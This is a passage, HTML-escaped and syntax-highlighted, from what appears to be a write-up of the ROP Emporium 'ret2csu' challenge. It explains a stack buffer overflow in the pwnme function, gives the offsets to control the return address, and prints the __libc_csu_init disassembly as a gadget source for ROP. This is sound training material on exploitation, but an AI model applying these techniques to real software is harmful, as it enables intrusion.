  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000000009c4&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;138&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;lea&lt;/span&gt;    rdi,[&lt;span style=&#34;color:#ef6155&#34;&gt;rip&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x34a&lt;/span&gt;]        &lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0xd15&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000000009cb&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;145&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;0x7a0&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;puts@plt&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000000009d0&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;150&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;nop&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000000009d1&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;151&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;leave&lt;/span&gt;  
  &lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;x00000000000009d2&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;152&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:	&lt;span style=&#34;color:#ef6155&#34;&gt;ret&lt;/span&gt;    
&lt;span style=&#34;color:#06b6ef&#34;&gt;End&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;assembler&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;dump.&lt;/span&gt;
&lt;span style=&#34;color:#ef6155&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;gdb&lt;/span&gt;) 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the above disassembled code, we are reading more than the allocated buffer from the standard input, therefore leading to stack buffer overflow and corrupting the adjacent memory region. The program allocates a stack of fixed size 32bytes. we are reading  &lt;strong&gt;0x200&lt;/strong&gt; from the standard input file descriptor, which is more than the buffer size.
The c equivalent of the above vulnerability is,&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;read(&lt;span style=&#34;color:#f99b15&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;(rbp&lt;span style=&#34;color:#5bc4bf&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x20&lt;/span&gt;), &lt;span style=&#34;color:#f99b15&#34;&gt;0x200&lt;/span&gt;) &lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt;reading &lt;span style=&#34;color:#f99b15&#34;&gt;0x200&lt;/span&gt; from the stdin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For exploitation purpose, is to control the return address of the pwnme function and redirect the execution to our desired address. In order to control the return address we need to fill the buffer with enough data and overflow the saved base pointer.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://thuri10.github.io/post/ropemporium/stack.png&#34; &gt;
		&lt;img src=&#34;https://thuri10.github.io/post/ropemporium/stack.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			alt=&#34;ret control&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;ret control&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;From the stack image layout above, we need 32 bytes to fill the buffer, 8 bytes to overwrite the saved base pointer and 8 bytes to control return address. Because the &lt;strong&gt;NX&lt;/strong&gt; execution is enabled on the binary, we can`t use the shellcode techniques, therefore we use other methods such a ropping.&lt;/p&gt;
&lt;h2 id=&#34;__libc_csu_init__-disassembly&#34;&gt;&lt;strong&gt;libc_csu_init&lt;/strong&gt; Disassembly&lt;/h2&gt;
&lt;p&gt;Below is the disassembled code for &lt;strong&gt;__libc_csu_init&lt;/strong&gt; section for the ret2csu binary using objdump tool.objdump is a linux command line tool used for disassembling binaries.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;0000000000400640&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;__libc_csu_init&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:
  &lt;span style=&#34;color:#ef6155&#34;&gt;400640:&lt;/span&gt;	&lt;span style=&#34;color:#ef6155&#34;&gt;41&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;57&lt;/span&gt;                	&lt;span style=&#34;color:#06b6ef&#34;&gt;push&lt;/span&gt;   &lt;span style=&#34;color:#ef6155&#34;&gt;r15&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;400642:&lt;/span&gt;	&lt;span style=&#34;color:#ef6155&#34;&gt;41&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;56&lt;/span&gt;                	&lt;span style=&#34;color:#06b6ef&#34;&gt;push&lt;/span&gt;   &lt;span style=&#34;color:#ef6155&#34;&gt;r14&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;400644:&lt;/span&gt;	&lt;span style=&#34;color:#ef6155&#34;&gt;49&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;89&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;d7&lt;/span&gt;             	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color:#ef6155&#34;&gt;r15&lt;/span&gt;,rdx
  &lt;span style=&#34;color:#ef6155&#34;&gt;400647:&lt;/span&gt;	&lt;span style=&#34;color:#ef6155&#34;&gt;41&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;55&lt;/span&gt;                	&lt;span style=&#34;color:#06b6ef&#34;&gt;push&lt;/span&gt;   &lt;span style=&#34;color:#ef6155&#34;&gt;r13&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;400649:&lt;/span&gt;	&lt;span style=&#34;color:#ef6155&#34;&gt;41&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;54&lt;/span&gt;                	&lt;span style=&#34;color:#06b6ef&#34;&gt;push&lt;/span&gt;   &lt;span style=&#34;color:#ef6155&#34;&gt;r12&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;40064&lt;/span&gt;b:	&lt;span style=&#34;color:#ef6155&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;d&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;25&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;9&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;e&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;07&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;20&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;00&lt;/span&gt; 	&lt;span style=&#34;color:#ef6155&#34;&gt;lea&lt;/span&gt;    &lt;span style=&#34;color:#ef6155&#34;&gt;r12&lt;/span&gt;,[&lt;span style=&#34;color:#ef6155&#34;&gt;rip&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x20079e&lt;/span&gt;]        &lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;600&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;df0&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;__frame_dummy_init_array_entry&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;400652:&lt;/span&gt;	&lt;span style=&#34;color:#ef6155&#34;&gt;55&lt;/span&gt;                   	&lt;span style=&#34;color:#06b6ef&#34;&gt;push&lt;/span&gt;   rbp
  &lt;span style=&#34;color:#ef6155&#34;&gt;400653:&lt;/span&gt;	&lt;span style=&#34;color:#ef6155&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;d&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;d&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;9&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;e&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;07&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;20&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;00&lt;/span&gt; 	&lt;span style=&#34;color:#ef6155&#34;&gt;lea&lt;/span&gt;    rbp,[&lt;span style=&#34;color:#ef6155&#34;&gt;rip&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x20079e&lt;/span&gt;]        &lt;span style=&#34;color:#ef6155&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;600&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;df8&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;__do_global_dtors_aux_fini_array_entry&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;40065&lt;/span&gt;a:	&lt;span style=&#34;color:#ef6155&#34;&gt;53&lt;/span&gt;                   	&lt;span style=&#34;color:#06b6ef&#34;&gt;push&lt;/span&gt;   rbx
  &lt;span style=&#34;color:#ef6155&#34;&gt;40065&lt;/span&gt;b:	&lt;span style=&#34;color:#ef6155&#34;&gt;41&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;89&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;fd&lt;/span&gt;             	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    r13d,edi
  &lt;span style=&#34;color:#ef6155&#34;&gt;40065&lt;/span&gt;e:	&lt;span style=&#34;color:#ef6155&#34;&gt;49&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;89&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;f6&lt;/span&gt;             	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color:#ef6155&#34;&gt;r14&lt;/span&gt;,rsi
  &lt;span style=&#34;color:#ef6155&#34;&gt;400661:&lt;/span&gt;	&lt;span style=&#34;color:#ef6155&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;29&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;e5&lt;/span&gt;             	&lt;span style=&#34;color:#ef6155&#34;&gt;sub&lt;/span&gt;    rbp,&lt;span style=&#34;color:#ef6155&#34;&gt;r12&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;400664:&lt;/span&gt;	&lt;span style=&#34;color:#ef6155&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;83&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;ec&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;08&lt;/span&gt;          	&lt;span style=&#34;color:#ef6155&#34;&gt;sub&lt;/span&gt;    rsp,&lt;span style=&#34;color:#f99b15&#34;&gt;0x8&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;400668:&lt;/span&gt;	&lt;span style=&#34;color:#ef6155&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;c1&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;fd&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;03&lt;/span&gt;          	&lt;span style=&#34;color:#ef6155&#34;&gt;sar&lt;/span&gt;    rbp,&lt;span style=&#34;color:#f99b15&#34;&gt;0x3&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;40066&lt;/span&gt;c:	&lt;span style=&#34;color:#06b6ef&#34;&gt;e8&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;f&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;fe&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;ff&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;ff&lt;/span&gt;       	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#f99b15&#34;&gt;4004&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;d0&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;_init&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;400671:&lt;/span&gt;	&lt;span style=&#34;color:#ef6155&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;85&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;ed&lt;/span&gt;             	&lt;span style=&#34;color:#ef6155&#34;&gt;test&lt;/span&gt;   rbp,rbp
  &lt;span style=&#34;color:#ef6155&#34;&gt;400674:&lt;/span&gt;	&lt;span style=&#34;color:#ef6155&#34;&gt;74&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;20&lt;/span&gt;                	&lt;span style=&#34;color:#06b6ef&#34;&gt;je&lt;/span&gt;     &lt;span style=&#34;color:#f99b15&#34;&gt;400696&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;__libc_csu_init&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x56&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;400676:&lt;/span&gt;	&lt;span style=&#34;color:#ef6155&#34;&gt;31&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;db&lt;/span&gt;                	&lt;span style=&#34;color:#ef6155&#34;&gt;xor&lt;/span&gt;    ebx,ebx
  &lt;span style=&#34;color:#ef6155&#34;&gt;400678:&lt;/span&gt;	&lt;span style=&#34;color:#ef6155&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;f&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;f&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;84&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;00&lt;/span&gt; 	&lt;span style=&#34;color:#ef6155&#34;&gt;nop&lt;/span&gt;    &lt;span style=&#34;color:#fec418&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;PTR&lt;/span&gt; [rax&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;rax&lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x0&lt;/span&gt;]
  &lt;span style=&#34;color:#ef6155&#34;&gt;40067&lt;/span&gt;f:	&lt;span style=&#34;color:#ef6155&#34;&gt;00&lt;/span&gt; 
  &lt;span style=&#34;color:#ef6155&#34;&gt;400680:&lt;/span&gt;	&lt;span style=&#34;color:#ef6155&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;89&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;fa&lt;/span&gt;             	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    rdx,&lt;span style=&#34;color:#ef6155&#34;&gt;r15&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;400683:&lt;/span&gt;	&lt;span style=&#34;color:#ef6155&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;89&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;f6&lt;/span&gt;             	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    rsi,&lt;span style=&#34;color:#ef6155&#34;&gt;r14&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;400686:&lt;/span&gt;	&lt;span style=&#34;color:#ef6155&#34;&gt;44&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;89&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;ef&lt;/span&gt;             	&lt;span style=&#34;color:#ef6155&#34;&gt;mov&lt;/span&gt;    edi,r13d
  &lt;span style=&#34;color:#ef6155&#34;&gt;400689:&lt;/span&gt;	&lt;span style=&#34;color:#ef6155&#34;&gt;41&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;ff&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;14&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;dc&lt;/span&gt;          	&lt;span style=&#34;color:#ef6155&#34;&gt;call&lt;/span&gt;   &lt;span style=&#34;color:#fec418&#34;&gt;QWORD&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;PTR&lt;/span&gt; [&lt;span style=&#34;color:#ef6155&#34;&gt;r12&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;rbx&lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;8&lt;/span&gt;]
  &lt;span style=&#34;color:#ef6155&#34;&gt;40068&lt;/span&gt;d:	&lt;span style=&#34;color:#ef6155&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;83&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;c3&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;01&lt;/span&gt;          	&lt;span style=&#34;color:#ef6155&#34;&gt;add&lt;/span&gt;    rbx,&lt;span style=&#34;color:#f99b15&#34;&gt;0x1&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;400691:&lt;/span&gt;	&lt;span style=&#34;color:#ef6155&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;39&lt;/span&gt; &lt;span style=&#34;color:#815ba4&#34;&gt;dd&lt;/span&gt;             	&lt;span style=&#34;color:#ef6155&#34;&gt;cmp&lt;/span&gt;    rbp,rbx
  &lt;span style=&#34;color:#ef6155&#34;&gt;400694:&lt;/span&gt;	&lt;span style=&#34;color:#ef6155&#34;&gt;75&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;ea&lt;/span&gt;                	&lt;span style=&#34;color:#ef6155&#34;&gt;jne&lt;/span&gt;    &lt;span style=&#34;color:#f99b15&#34;&gt;400680&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;__libc_csu_init&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x40&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;400696:&lt;/span&gt;	&lt;span style=&#34;color:#ef6155&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;83&lt;/span&gt; &lt;span style=&#34;color:#06b6ef&#34;&gt;c4&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;08&lt;/span&gt;          	&lt;span style=&#34;color:#ef6155&#34;&gt;add&lt;/span&gt;    rsp,&lt;span style=&#34;color:#f99b15&#34;&gt;0x8&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;40069&lt;/span&gt;a:	&lt;span style=&#34;color:#ef6155&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b&lt;/span&gt;                   	&lt;span style=&#34;color:#ef6155&#34;&gt;pop&lt;/span&gt;    rbx
  &lt;span style=&#34;color:#ef6155&#34;&gt;40069&lt;/span&gt;b:	&lt;span style=&#34;color:#ef6155&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;d&lt;/span&gt;                   	&lt;span style=&#34;color:#ef6155&#34;&gt;pop&lt;/span&gt;    rbp
  &lt;span style=&#34;color:#ef6155&#34;&gt;40069&lt;/span&gt;c:	&lt;span style=&#34;color:#ef6155&#34;&gt;41&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;c&lt;/span&gt;                	&lt;span style=&#34;color:#ef6155&#34;&gt;pop&lt;/span&gt;    &lt;span style=&#34;color:#ef6155&#34;&gt;r12&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;40069&lt;/span&gt;e:	&lt;span style=&#34;color:#ef6155&#34;&gt;41&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;d&lt;/span&gt;                	&lt;span style=&#34;color:#ef6155&#34;&gt;pop&lt;/span&gt;    &lt;span style=&#34;color:#ef6155&#34;&gt;r13&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;4006&lt;/span&gt;a0:	&lt;span style=&#34;color:#ef6155&#34;&gt;41&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;e&lt;/span&gt;                	&lt;span style=&#34;color:#ef6155&#34;&gt;pop&lt;/span&gt;    &lt;span style=&#34;color:#ef6155&#34;&gt;r14&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;4006&lt;/span&gt;a2:	&lt;span style=&#34;color:#ef6155&#34;&gt;41&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;f&lt;/span&gt;                	&lt;span style=&#34;color:#ef6155&#34;&gt;pop&lt;/span&gt;    &lt;span style=&#34;color:#ef6155&#34;&gt;r15&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;4006&lt;/span&gt;a4:	&lt;span style=&#34;color:#06b6ef&#34;&gt;c3&lt;/span&gt;                   	&lt;span style=&#34;color:#ef6155&#34;&gt;ret&lt;/span&gt;    
  &lt;span style=&#34;color:#ef6155&#34;&gt;4006&lt;/span&gt;a5:	&lt;span style=&#34;color:#ef6155&#34;&gt;90&lt;/span&gt;                   	&lt;span style=&#34;color:#06b6ef&#34;&gt;nop&lt;/span&gt;
  &lt;span style=&#34;color:#ef6155&#34;&gt;4006&lt;/span&gt;a6:	&lt;span style=&#34;color:#ef6155&#34;&gt;66&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;e&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;f&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;f&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;84&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#f99b15&#34;&gt;00&lt;/span&gt; 	cs &lt;span style=&#34;color:#ef6155&#34;&gt;nop&lt;/span&gt; &lt;span style=&#34;color:#fec418&#34;&gt;WORD&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;PTR&lt;/span&gt; [rax&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;rax&lt;span style=&#34;color:#5bc4bf&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f99b15&#34;&gt;0x0&lt;/span&gt;]
  &lt;span style=&#34;color:#ef6155&#34;&gt;4006&lt;/span&gt;ad:	&lt;span style=&#34;color:#ef6155&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#ef6155&#34;&gt;00&lt;/span&gt; 

&lt;span style=&#34;color:#ef6155&#34;&gt;00000000004006&lt;/span&gt;&lt;span style=&#34;color:#06b6ef&#34;&gt;b0&lt;/span&gt; &lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ef6155&#34;&gt;__libc_csu_fini&lt;/span&gt;&lt;span style=&#34;color:#5bc4bf&#34;&gt;&amp;gt;&lt;/span&gt;:
